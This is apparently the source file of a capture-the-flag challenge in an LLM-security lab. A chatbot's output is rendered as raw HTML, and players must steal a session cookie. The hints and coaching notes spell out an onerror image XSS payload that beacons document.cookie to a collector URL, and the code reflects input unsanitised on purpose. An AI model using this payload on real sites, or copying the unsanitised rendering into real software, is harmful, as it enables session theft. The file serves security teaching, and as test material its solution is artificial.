"""LLM05:2025 — Improper Output Handling.

The app renders this assistant's output as raw HTML (the vulnerability): the
frontend drops the reply straight into the DOM via innerHTML. FormatBot echoes
whatever markup you ask it to, unsanitised.

There is NO flag in the page. What the page *does* hold is a per-session secret
token in a JS-READABLE cookie (document.cookie) — the kind of in-page secret a
real XSS steals. Popping an alert proves execution but exfiltrates nothing and
reveals nothing. To win you must inject a vector that READS that token and
BEACONS it to the attacker collector at `/api/lab/llm05/collect?token=…`. When
the server sees the correct token arrive over that channel, the flag is released
and the page shows it in a green banner. So the reveal is the *result* of a real
exfiltration, not a string match — and a bare `onerror=alert(1)` no longer works.
"""
import re

from config import FLAG_PREFIX
from . import Challenge, decode_flag_part, register

_FLAG_SUFFIX = decode_flag_part("MdMBPKhQQxZDjSJBW8HORC60UE8XhohxR1v2isQxmHv83d9lHQseUqfF4AtihTrIrgQ0ipVdRAe8gQ==")
FLAG = f"{FLAG_PREFIX}{{{_FLAG_SUFFIX}}}"

# Structural detectors — used ONLY to coach the player. The real win is the
# token reaching the collector from their injected code (see app.py).
_EVENT_HANDLER = re.compile(r"<[^>]*\son[a-z]+\s*=", re.IGNORECASE)
_SCRIPT_TAG = re.compile(r"<\s*script\b", re.IGNORECASE)
_JS_URI = re.compile(r"javascript\s*:", re.IGNORECASE)
# References to the in-page secret + an outbound sink = an actual exfiltration attempt.
_READS_TOKEN = re.compile(r"document\.cookie|\bcookie\b|session[_ ]?token|__vaulttoken|vaulttoken|\btoken\b", re.IGNORECASE)
_HAS_SINK = re.compile(r"fetch\s*\(|xmlhttprequest|new\s+image|\.src\s*=|sendbeacon|"
                       r"location\s*=|location\.href|/collect|collect\?", re.IGNORECASE)

_MARKERS = ("reply with exactly:", "output:", "render:", "say exactly:", "echo:")
_ASK_DIRECT = re.compile(r"\b(flag|secret|token|password|access\s*code|api\s*key)\b", re.IGNORECASE)
_GIVE_ME = re.compile(r"\b(give|show|tell|reveal|hand|print|what['\u2019]?s|where|leak)\b", re.IGNORECASE)
_META = re.compile(r"\b(help|how|hint|stuck|solve|start|begin|what can you|who are you|hi|hello|hey)\b", re.IGNORECASE)
_XSS_TALK = re.compile(r"\b(xss|inject|payload|html|markup|script|dom|render|innerhtml|exploit|vector)\b", re.IGNORECASE)


def _is_execution_vector(p: str) -> bool:
    return bool(_SCRIPT_TAG.search(p) or _JS_URI.search(p) or _EVENT_HANDLER.search(p))


def _is_exfil_vector(p: str) -> bool:
    return _is_execution_vector(p) and bool(_READS_TOKEN.search(p) and _HAS_SINK.search(p))


@register
class OutputHandling(Challenge):
    id = "llm05"
    owasp = "LLM05:2025 Improper Output Handling"
    title = "Rendered Without Question"
    difficulty = "Hard"
    max_points = 300
    blurb = "The UI renders this bot's replies as raw HTML. Steal the page's secret through it."
    intro = ("I'm FormatBot. I output exactly what you ask me to — HTML, CSS, whatever — and "
             "whatever I say gets dropped straight into the page. There's no flag hidden here. "
             "But this app keeps your SESSION TOKEN in a JavaScript-readable cookie "
             "(document.cookie) — so if your markup actually runs, it could steal that cookie and "
             "send it to the exfil collector shown below the chat.")
    hints = [
        "This bot echoes your text straight into the page without sanitising it — classic "
        "improper output handling. Prefix a message with `output:` and watch where it lands. "
        "First question to answer: can you get the page to treat your input as HTML rather than "
        "as plain text?",
        "Plain tags render but don't DO anything, and a raw <script> injected via innerHTML "
        "won't execute. You need an element that runs JavaScript on its own the moment it's "
        "inserted — think about HTML attributes that fire automatically when something goes "
        "wrong loading.",
        "Executing isn't the goal — stealing is. The session token lives in `document.cookie`, and "
        "there's a collector under the chat that logs any request it receives. You don't need your own "
        "server: fire an outbound GET from JS with the cookie as a query param. The classic one-liner "
        "is `new Image().src='<collector-url>?c='+encodeURIComponent(document.cookie)`. Put that in an "
        "`onerror` on a broken image, sent via `output:`.",
    ]
    flag = FLAG   # never placed in the DOM; released only after real exfiltration to the collector
    defense = ("Treat all LLM output as untrusted. Context-aware encode/escape before "
               "rendering, use a strict CSP, and never innerHTML model output. Keep secrets out "
               "of the page and validate output before any downstream sink (OWASP LLM05).")
    render_html = True

    def respond(self, message: str, state: dict) -> str:
        low = message.lower()
        payload = message
        for marker in _MARKERS:
            i = low.find(marker)
            if i != -1:
                payload = message[i + len(marker):].strip()
                break
        has_markup = "<" in payload and ">" in payload

        # ---- If they sent markup, REFLECT it unsanitised (the vuln) and coach on how close it is.
        if has_markup:
            handler = bool(_EVENT_HANDLER.search(payload) or _JS_URI.search(payload))
            reads = bool(_READS_TOKEN.search(payload))
            sink = bool(_HAS_SINK.search(payload))
            if handler and reads and sink:
                note = ('<div class="xss-note">…your handler fired, read the in-page secret and made an '
                        'outbound call. If you pointed it at a collector you control, look at the banner '
                        'up top. 👀</div>')
            elif handler and reads and not sink:
                note = ('<div class="xss-note">⚡ Executed — and you\'re reading the page\'s secret. But '
                        'you\'re not sending it anywhere. Fire it out: '
                        '<code>new Image().src=\'&lt;collector&gt;?c=\'+encodeURIComponent(document.cookie)</code></div>')
            elif handler and sink and not reads:
                note = ('<div class="xss-note">⚡ Executed — and you\'re making an outbound request. But '
                        'you\'re not carrying the page\'s secret with it. Append the cookie: '
                        '<code>...?c=\'+encodeURIComponent(document.cookie)</code></div>')
            elif handler:
                note = ('<div class="xss-note">⚡ Your handler ran — but popping an alert only proves you can '
                        'execute. It steals nothing. Read the token and beacon it out, e.g. '
                        '<code>new Image().src=\'&lt;collector&gt;?c=\'+encodeURIComponent(document.cookie)</code> '
                        '(collector URL shown under the chat).</div>')
            elif _SCRIPT_TAG.search(payload):
                note = ('<div class="xss-note">…a &lt;script&gt; dropped in via innerHTML never runs. Reach for '
                        'an element whose event handler fires on its own when it\'s inserted — e.g. an '
                        '&lt;img&gt; with a broken src and an <code>onerror</code> that exfiltrates the cookie.</div>')
            elif "<img" in payload.lower():
                note = ('<div class="xss-note">…a broken image on its own does nothing. Give it an '
                        '<code>onerror</code> handler that runs when the load fails, and use it to steal + '
                        'send the cookie: '
                        '<code>&lt;img src=x onerror="new Image().src=\'&lt;collector&gt;?c=\'+encodeURIComponent(document.cookie)"&gt;</code></div>')
            else:
                note = ('<div class="xss-note">…rendered as raw HTML — but nothing executed. You need an element '
                        'that runs JS by itself (e.g. <code>&lt;img src=x onerror=...&gt;</code>) and uses it to '
                        'exfiltrate the session cookie to the collector.</div>')
            return payload + note

        # ---- No markup: behave like a chatbot and steer, without giving the answer away.
        if _ASK_DIRECT.search(low) and _GIVE_ME.search(low):
            return ("Ha — I'm not going to just hand it over. I don't even hold a flag. What I do is "
                    "print whatever you ask straight into this page. There's a secret kept in the page's "
                    "memory, though… if something you injected actually *ran*, it could go find it.")
        if _ASK_DIRECT.search(low):
            return ("The only secret here isn't something I'll type out — it lives in the page itself, in "
                    "memory. Getting to it is your job, not mine. Try making me output some markup.")
        if _XSS_TALK.search(low):
            return ("Now you're thinking. Get me to echo your markup with `output:` and make it something "
                    "that executes on its own — then have it grab what the page is holding and send it "
                    "off to somewhere you can see. An alert box won't cut it; that proves nothing left the page.")
        if _META.search(low):
            n = state.get("meta_i", 0); state["meta_i"] = n + 1
            tips = [
                "I'm FormatBot — I echo exactly what you tell me to, and it lands straight in the page. "
                "Ask me to `output:` some HTML and watch. (Hint: plain tags are boring; make it *do* something.)",
                "Whatever I say gets dropped into the DOM as-is — no sanitising. So the trick isn't tricking "
                "me, it's what your markup does once it's on the page. What could running code find here?",
                "There's a per-session secret sitting in this page's memory. I can't read it to you — but code "
                "that executes in the page can. Your move is to make me emit code that runs.",
            ]
            return tips[n % len(tips)]
        return ("I echo whatever you ask, verbatim, straight into the page — try `output: <your markup>`. "
                "Make it something that actually runs, not just plain tags.")
